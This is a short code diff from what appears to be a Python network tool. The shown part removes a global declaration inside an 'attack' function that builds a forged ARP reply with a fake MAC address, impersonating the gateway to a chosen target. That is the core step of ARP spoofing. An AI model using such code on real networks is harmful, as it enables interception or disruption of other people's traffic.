@@ -43,7 +43,6 @@ def scan_network(network):
 	print('-'*110)
 
 def attack(choice_target):
-	global packet, packet_2, target
 	mac_fake = "12:34:56:78:9A:BC"
 	target = lsts[choice_target]
 	packet = ARP(psrc=gw, hwsrc=mac_fake, pdst=target[0], hwdst=target[1], op=2)
